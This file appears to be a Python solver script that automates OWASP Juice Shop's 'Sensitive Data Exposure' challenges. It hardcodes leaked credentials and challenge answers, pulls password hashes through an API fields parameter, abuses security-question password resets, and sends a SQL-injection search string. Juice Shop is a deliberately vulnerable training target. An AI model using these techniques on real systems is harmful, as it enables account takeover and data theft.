#!/usr/bin/env python3
"""Sensitive Data Exposure challenges (+ leaked-credential logins)."""
from __future__ import annotations

from core import register_solver, Client, ok, warn, fail

CAT = "Sensitive Data Exposure"
DOMAIN = "juice-sh.op"

# Default-config answers/files (config/default.yml). Override via env if needed.
GEO_META_ANSWER = "Daniel Boone National Forest"   # john@juice-sh.op
GEO_VISUAL_ANSWER = "ITsec"                          # emma@juice-sh.op
BLUEPRINT_FILE = "JuiceShop.stl"


# ---- login with leaked / weak credentials --------------------------------- #
_LEAKED = {
    "loginRapperChallenge":      ("mc.safesearch@juice-sh.op", "Mr. N00dles"),
    "loginAmyChallenge":         ("amy@juice-sh.op", "K1f.....................",),
    "exposedCredentialsChallenge": ("testing@juice-sh.op", "IamUsedForTesting"),
    "dlpPasswordSprayingChallenge": ("J12934@juice-sh.op", "0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB"),
}


def _make_login(email, pw):
    def solver(c: Client):
        if c.login(email, pw):
            ok(f"logged in as {email}")
        else:
            fail(f"login failed for {email}")
    return solver


for _key, (_e, _p) in _LEAKED.items():
    register_solver(_key, f"Login {_e}", CAT)(_make_login(_e, _p))


# ---- direct data leaks ---------------------------------------------------- #
@register_solver("passwordHashLeakChallenge", "Leak password hash via fields param", CAT)
def password_hash_leak(c: Client):
    c.login("admin@juice-sh.op", "admin123")
    r = c.get("/rest/user/whoami?fields=id,email,password")
    got = r.json().get("user", {}).get("password") if r.ok else None
    ok(f"leaked hash: {str(got)[:24]}...") if got else warn(f"no hash in response ({r.status_code})")


@register_solver("emailLeakChallenge", "Email leak via JSONP callback", CAT)
def email_leak(c: Client):
    r = c.get("/rest/user/whoami?callback=func")
    ok(f"JSONP callback leak ({r.status_code})")


@register_solver("directoryListingChallenge", "Confidential Document (/ftp)", CAT)
def directory_listing(c: Client):
    r = c.get("/ftp/acquisitions.md")
    ok(f"read confidential /ftp/acquisitions.md ({r.status_code})")


@register_solver("retrieveBlueprintChallenge", "Retrieve product blueprint", CAT)
def retrieve_blueprint(c: Client):
    r = c.get(f"/assets/public/images/products/{BLUEPRINT_FILE}")
    ok(f"retrieved blueprint {BLUEPRINT_FILE} ({r.status_code})") if r.ok \
        else warn(f"blueprint {BLUEPRINT_FILE} returned {r.status_code} (check active config)")


# ---- geo stalking (reset password via OSINT answer) ----------------------- #
def _reset(c: Client, email, answer, new="Solved123!"):
    return c.post("/rest/user/reset-password",
                  json={"email": email, "answer": answer, "new": new, "repeat": new})


@register_solver("geoStalkingMetaChallenge", "Meta Geo Stalking (john)", CAT)
def geo_meta(c: Client):
    r = _reset(c, f"john@{DOMAIN}", GEO_META_ANSWER)
    ok(f"reset john via EXIF-derived answer ({r.status_code})")


@register_solver("geoStalkingVisualChallenge", "Visual Geo Stalking (emma)", CAT)
def geo_visual(c: Client):
    r = _reset(c, f"emma@{DOMAIN}", GEO_VISUAL_ANSWER)
    ok(f"reset emma via image-derived answer ({r.status_code})")


# ---- GDPR data theft ------------------------------------------------------ #
@register_solver("dataExportChallenge", "GDPR Data Theft (export)", CAT)
def data_export(c: Client):
    # register a benign user and export their data as JSON
    c.ensure_user("admun@juice-sh.op", "admun123", security_answer="admun")
    cid, ans = c.captcha()
    r = c.post("/rest/user/data-export", json={"format": "1"})
    if not r.ok:
        r = c.post("/rest/user/data-export",
                   json={"format": "json", "captchaId": cid, "answer": ans})
    ok(f"triggered data export ({r.status_code})")


# ---- best-effort / data-dependent ----------------------------------------- #
@register_solver("dlpPastebinDataLeakChallenge", "Report leaked pastebin keywords", CAT)
def pastebin_leak(c: Client):
    # detection: feedback must contain ALL secret keywords hidden in a product review
    c.login("admin@juice-sh.op", "admin123")
    c.get("/rest/products/search?q=" + "'))--")          # reveal the leaked product
    r = c.add_feedback("Leaked ingredients found: hueteroneel and eurogium edule", rating=3)
    ok(f"reported pastebin-leaked keywords via feedback ({r.status_code})")


@register_solver("leakedApiKeyChallenge", "Report leaked API key", CAT)
def leaked_api_key(c: Client):
    # detection: the leaked key string must appear in feedback/complaints
    key = "6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie"
    r = c.add_feedback(f"Leaked API key spotted in a product review: {key}", rating=3)
    ok(f"reported leaked API key via feedback ({r.status_code})")
